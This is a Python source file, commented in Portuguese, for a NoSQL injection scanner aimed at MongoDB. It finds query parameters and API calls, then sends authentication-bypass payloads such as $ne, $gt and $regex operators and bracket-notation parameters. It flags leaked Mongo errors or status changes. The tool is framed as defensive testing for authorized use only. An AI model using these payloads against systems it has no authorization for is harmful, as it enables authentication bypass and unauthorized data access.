"""
Scanner de NoSQL Injection (MongoDB) — modo detecção, NÃO destrutivo.

⚠️  USO AUTORIZADO: apenas em sites/APIs seus ou com permissão explícita.

Foco no risco do dono: impedir que alguém burle a autenticação ou manipule
queries pra ler/alterar dados (ex.: adicionar saldo/licença) injetando
operadores do MongoDB.

Payloads usados (todos de LEITURA / bypass — nunca $set/$inc/update):
- {"$ne": null}, {"$gt": ""}, {"$regex": ".*"}
- bracket notation em query string: param[$ne]=x

Detecção por:
1. Erros do MongoDB/driver vazados na resposta.
2. Mudança de comportamento: a injeção retorna mais dados / autentica / muda
   o status em relação ao valor normal (boolean/auth bypass).
"""

import re
import json as _json
from urllib.parse import urlparse, parse_qs, urlunparse

import httpx
from playwright.async_api import async_playwright


# Assinaturas de erro típicas de MongoDB / drivers (Mongoose, pymongo, etc.)
MONGO_ERROR_SIGNATURES = [
    r"MongoError",
    r"MongoServerError",
    r"MongoNetworkError",
    r"BSONError",
    r"BSONTypeError",
    r"CastError",                 # Mongoose
    r"ValidatorError",            # Mongoose
    r"unknown operator",
    r"\$where",
    r"failed to parse",
    r"E11000",                    # duplicate key
    r"can't canonicalize query",
    r"ObjectParameterError",
    r"Cast to ObjectId failed",
]
_MONGO_RE = re.compile("|".join(MONGO_ERROR_SIGNATURES), re.IGNORECASE)


def _detect_mongo_error(text: str) -> str | None:
    m = _MONGO_RE.search(text or "")
    return m.group(0) if m else None


def _build_url_with_raw(url: str, raw_param: str, value: str) -> str:
    """Adiciona um parâmetro 'cru' (ex.: 'email[$ne]') à query string."""
    parsed = urlparse(url)
    existing = parsed.query
    extra = f"{raw_param}={value}"
    new_query = f"{existing}&{extra}" if existing else extra
    return urlunparse(parsed._replace(query=new_query))


async def _probe_get_param_nosql(client: httpx.AsyncClient, url: str, param: str) -> dict | None:
    """Injeta operadores Mongo num parâmetro de query (bracket notation)."""
    try:
        base = await client.get(url)
        inj = await client.get(_build_url_with_raw(url, f"{param}[$ne]", "x"))
    except Exception:
        return None

    sig = _detect_mongo_error(inj.text)
    if sig:
        return {
            "point": f"query param '{param}'",
            "method": "GET",
            "type": "error-based",
            "evidence": f"Erro MongoDB vazado: '{sig}'",
            "severity": "ALTA",
        }
    # Só sinaliza com sinal forte: mudança de STATUS (não confiar só em tamanho,
    # que varia com conteúdo dinâmico). Bypass = injeção passou onde baseline falhou.
    if base.status_code != inj.status_code:
        sev = "ALTA" if (base.status_code >= 400 and inj.status_code < 300) else "MÉDIA"
        return {
            "point": f"query param '{param}'",
            "method": "GET",
            "type": "behavior-based (suspeita)",
            "evidence": f"Operador $ne mudou o status ({base.status_code}->{inj.status_code}) — confirme manualmente",
            "severity": sev,
        }
    return None


# Operadores que substituem o valor de um campo JSON (leitura/bypass)
_JSON_OPERATORS = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}]


async def test_json_endpoint(
    endpoint: str,
    body: dict,
    method: str = "POST",
    timeout: float = 20.0,
) -> dict:
    """
    Testa um endpoint de API JSON injetando operadores Mongo em cada campo.
    `body` é um exemplo de payload válido (ex.: {"email":"a@a.com","password":"x"}).
    NÃO destrutivo: só envia operadores de leitura/bypass.
    """
    result = {"endpoint": endpoint, "method": method.upper(), "findings": [], "tested": 0}
    headers = {"Content-Type": "application/json",
               "User-Agent": "AgenteMAX-NoSQLScanner/1.0 (authorized testing)"}

    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, headers=headers) as client:
        try:
            baseline = await client.request(method, endpoint, content=_json.dumps(body))
        except Exception as e:
            result["error"] = f"Falha ao chamar o endpoint: {e}"
            return result

        for field in list(body.keys()):
            result["tested"] += 1
            for op in _JSON_OPERATORS:
                payload = {**body, field: op}
                try:
                    r = await client.request(method, endpoint, content=_json.dumps(payload))
                except Exception:
                    continue

                sig = _detect_mongo_error(r.text)
                if sig:
                    result["findings"].append({
                        "point": f"campo '{field}'",
                        "method": method.upper(),
                        "type": "error-based",
                        "evidence": f"Operador {op} causou erro Mongo: '{sig}'",
                        "severity": "ALTA",
                    })
                    break
                # Bypass de auth: injeção retorna 2xx onde o baseline falhou (401/400/403)
                if baseline.status_code >= 400 and r.status_code < 300:
                    result["findings"].append({
                        "point": f"campo '{field}'",
                        "method": method.upper(),
                        "type": "auth-bypass",
                        "evidence": f"Operador {op} retornou {r.status_code} (baseline era {baseline.status_code}) "
                                    f"— possível bypass de autenticação/filtro!",
                        "severity": "CRÍTICA",
                    })
                    break
    return result


async def _discover_points(url: str, timeout_ms: int) -> dict:
    """Descobre query params da URL e endpoints de API chamados pela página."""
    points = {"query_params": list(parse_qs(urlparse(url).query).keys()), "api_calls": []}
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await (await browser.new_context()).new_page()

            def _on_req(req):
                rt = req.resource_type
                if rt in ("xhr", "fetch"):
                    points["api_calls"].append({"url": req.url, "method": req.method})
            page.on("request", _on_req)
            try:
                await page.goto(url, wait_until="networkidle", timeout=timeout_ms)
            finally:
                await browser.close()
    except Exception as e:
        points["discovery_error"] = str(e)
    return points


async def scan_nosql(url: str, timeout_ms: int = 15000) -> dict:
    """
    Scan automático de NoSQL Injection a partir de uma URL:
    testa os query params e lista os endpoints de API observados (pra teste manual/direto).
    """
    result = {"url": url, "entry_points": {}, "findings": [], "tested": 0, "api_calls": []}
    points = await _discover_points(url, timeout_ms)
    result["entry_points"] = {"query_params": points["query_params"]}
    result["api_calls"] = points.get("api_calls", [])
    if points.get("discovery_error"):
        result["discovery_error"] = points["discovery_error"]

    headers = {"User-Agent": "AgenteMAX-NoSQLScanner/1.0 (authorized testing)"}
    async with httpx.AsyncClient(timeout=20.0, follow_redirects=True, headers=headers) as client:
        for param in points["query_params"]:
            result["tested"] += 1
            f = await _probe_get_param_nosql(client, url, param)
            if f:
                result["findings"].append(f)
    return result
